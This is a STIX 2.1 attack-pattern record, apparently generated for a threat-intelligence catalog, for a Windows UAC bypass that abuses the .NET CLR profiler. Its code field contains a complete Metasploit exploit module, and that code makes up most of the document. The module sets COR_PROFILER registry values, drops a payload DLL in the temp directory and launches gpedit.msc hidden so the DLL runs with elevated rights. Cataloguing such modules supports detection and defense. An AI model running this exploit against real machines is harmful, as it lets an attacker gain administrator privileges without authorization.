{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--eb778237-17b3-48a3-b39d-5515c28e8af8",
    "created": "2024-08-14T16:49:18.524413Z",
    "modified": "2024-08-14T16:49:18.524417Z",
    "name": "Windows Escalate UAC Protection Bypass (Via dot net profiler)",
    "description": " Microsoft Windows allows for the automatic loading of a profiling COM object during the launch of a CLR process based on certain environment variables ostensibly to monitor execution.  In this case, we abuse the profiler by pointing to a payload DLL that will be launched as the profiling thread.  This thread will run at the permission level of the calling process, so an auto-elevating process will launch the DLL with elevated permissions.  In this case, we use gpedit.msc as the auto-elevated CLR process, but others would work, too.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/bypassuac_dotnet_profiler.rb",
            "external_id": "bypassuac_dotnet_profiler.rb"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2017/Jul/11"
        },
        {
            "source_name": "reference",
            "url": "https://offsec.provadys.com/UAC-bypass-dotnet.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Post::Windows::Priv\n  include Post::Windows::Runas\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Escalate UAC Protection Bypass (Via dot net profiler)',\n        'Description' => %q{\n          Microsoft Windows allows for the automatic loading of a profiling COM object during\n          the launch of a CLR process based on certain environment variables ostensibly to\n          monitor execution.  In this case, we abuse the profiler by pointing to a payload DLL\n          that will be launched as the profiling thread.  This thread will run at the permission\n          level of the calling process, so an auto-elevating process will launch the DLL with\n          elevated permissions.  In this case, we use gpedit.msc as the auto-elevated CLR\n          process, but others would work, too.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Casey Smith', # UAC bypass discovery and research\n          '\"Stefan Kanthak\" <stefan.kanthak () nexgo de>', # UAC bypass discovery and research\n          'bwatters-r7', # Module\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [\n          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK],\n          'Reliability' => []\n        },\n        'References' => [\n          ['URL', 'https://seclists.org/fulldisclosure/2017/Jul/11'],\n          ['URL', 'https://offsec.provadys.com/UAC-bypass-dotnet.html']\n        ],\n        'DisclosureDate' => '2017-03-17',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n    register_options(\n      [OptString.new('PAYLOAD_NAME', [false, 'The filename to use for the payload binary (%RAND% by default).', nil])]\n    )\n  end\n\n  def check\n    if is_uac_enabled?\n      Exploit::CheckCode::Appears\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def write_reg_value(registry_hash)\n    vprint_status(\"Writing #{registry_hash[:value_name]} to #{registry_hash[:key_name]}\")\n    begin\n      if !registry_key_exist?(registry_hash[:key_name])\n        registry_createkey(registry_hash[:key_name])\n        registry_hash[:delete_on_cleanup] = true\n      else\n        registry_hash[:delete_on_cleanup] = false\n      end\n      registry_setvaldata(registry_hash[:key_name], \\\n                          registry_hash[:value_name], \\\n                          registry_hash[:value_value], \\\n                          registry_hash[:value_type])\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_error(e.to_s)\n    end\n  end\n\n  def remove_reg_value(registry_hash)\n    # we may have already deleted the key\n    return unless registry_key_exist?(registry_hash[:key_name])\n\n    begin\n      if registry_hash[:delete_on_cleanup]\n        vprint_status(\"Deleting #{registry_hash[:key_name]} key\")\n        registry_deletekey(registry_hash[:key_name])\n      else\n        vprint_status(\"Deleting #{registry_hash[:value_name]} from #{registry_hash[:key_name]} key\")\n        registry_deleteval(registry_hash[:key_name], registry_hash[:value_name])\n      end\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_bad('Unable to clean up registry')\n      print_error(e.to_s)\n    end\n  end\n\n  def exploit\n    @reg_keys = []\n    check_permissions!\n    case get_uac_level\n    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,\n      UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,\n      UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT\n      fail_with(Failure::NotVulnerable,\n                \"UAC is set to 'Always Notify'. This module does not bypass this setting, exiting...\")\n    when UAC_DEFAULT\n      print_good('UAC is set to Default')\n      print_good('BypassUAC can bypass this setting, continuing...')\n    when UAC_NO_PROMPT\n      print_warning('UAC set to DoNotPrompt - using ShellExecute \"runas\" method instead')\n      shell_execute_exe\n      return\n    end\n\n    # get directory locations straight\n    win_dir = session.sys.config.getenv('windir')\n    vprint_status('win_dir = ' + win_dir)\n    tmp_dir = session.sys.config.getenv('tmp')\n    vprint_status('tmp_dir = ' + tmp_dir)\n    exploit_dir = win_dir + '\\\\System32\\\\'\n    vprint_status('exploit_dir = ' + exploit_dir)\n    target_filepath = exploit_dir + 'gpedit.msc'\n    vprint_status('target_filepath = ' + target_filepath)\n    payload_name = datastore['PAYLOAD_NAME'] || Rex::Text.rand_text_alpha(rand(6..13)) + '.dll'\n    payload_pathname = tmp_dir + '\\\\' + payload_name\n\n    # make payload\n    vprint_status('Making Payload')\n    vprint_status('payload_pathname = ' + payload_pathname)\n    payload = generate_payload_dll\n\n    uuid = SecureRandom.uuid\n    vprint_status(\"UUID = #{uuid}\")\n    # This reg key will not hurt anything in windows 10+, but is not required.\n    version = get_version_info\n    unless version.build_number >= Msf::WindowsVersion::Win10_InitialRelease\n      @reg_keys.push(key_name: \"HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{#{uuid}}\\\\InprocServer32\",\n                    value_name: '',\n                    value_type: 'REG_EXPAND_SZ',\n                    value_value: payload_pathname,\n                    delete_on_cleanup: false)\n    end\n    reg_keys.push(key_name: \"HKCU\\\\Environment\",\n                  value_name: 'COR_PROFILER',\n                  value_type: 'REG_SZ',\n                  value_value: \"{#{uuid}}\",\n                  delete_on_cleanup: false)\n    reg_keys.push(key_name: \"HKCU\\\\Environment\",\n                  value_name: 'COR_ENABLE_PROFILING',\n                  value_type: 'REG_SZ',\n                  value_value: '1',\n                  delete_on_cleanup: false)\n    reg_keys.push(key_name: \"HKCU\\\\Environment\",\n                  value_name: 'COR_PROFILER_PATH',\n                  value_type: 'REG_SZ',\n                  value_value: payload_pathname,\n                  delete_on_cleanup: false)\n    @reg_keys.each do |key_hash|\n      write_reg_value(key_hash)\n    end\n\n    # Upload payload\n    vprint_status(\"Uploading Payload to #{payload_pathname}\")\n    write_file(payload_pathname, payload)\n    vprint_status('Payload Upload Complete')\n\n    vprint_status('Launching ' + target_filepath)\n    begin\n      session.sys.process.execute(\"cmd.exe /c \\\"#{target_filepath}\\\"\", nil, 'Hidden' => true)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_error(e.to_s)\n    end\n    print_warning(\"This exploit requires manual cleanup of '#{payload_pathname}'\")\n    print_status('Please wait for session and cleanup....')\n  end\n\n  def cleanup\n    if @reg_keys.present?\n    vprint_status('Removing Registry Changes')\n      @reg_keys.each do |key_hash|\n        remove_reg_value(key_hash)\n      end\n    vprint_status('Registry Changes Removed')\n    end\n  end\n\n  def check_permissions!\n    unless check == Exploit::CheckCode::Appears\n      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')\n    end\n    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?\n    # Check if you are an admin\n    # is_in_admin_group can be nil, true, or false\n    print_status('UAC is Enabled, checking level...')\n    vprint_status('Checking admin status...')\n    admin_group = is_in_admin_group?\n    if admin_group.nil?\n      print_error('Either whoami is not there or failed to execute')\n      print_error('Continuing under assumption you already checked...')\n    elsif admin_group\n      print_good('Part of Administrators group! Continuing...')\n    else\n      fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')\n    end\n\n    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]\n      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-03-17",
    "x_mitre_platforms": [
        "['win']"
    ]
}